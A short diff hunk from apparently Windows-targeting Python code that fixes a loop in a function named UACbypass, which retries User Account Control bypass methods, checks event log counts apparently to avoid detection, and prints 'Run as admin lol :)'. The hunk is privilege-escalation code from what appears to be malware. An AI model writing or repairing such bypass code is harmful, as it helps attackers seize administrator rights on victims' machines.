@@ -45,7 +45,7 @@ def UACbypass(method: int = 1) -> bool:
             if log_count_after > log_count_before:
                 return UACbypass(method + 1)
         else:
-            while uacMethod1(sys.executable): print("Run as admin lol :)")
+            while not uacMethod1(sys.executable): print("Run as admin lol :)")
         return True
 
 def IsAdmin() -> bool:
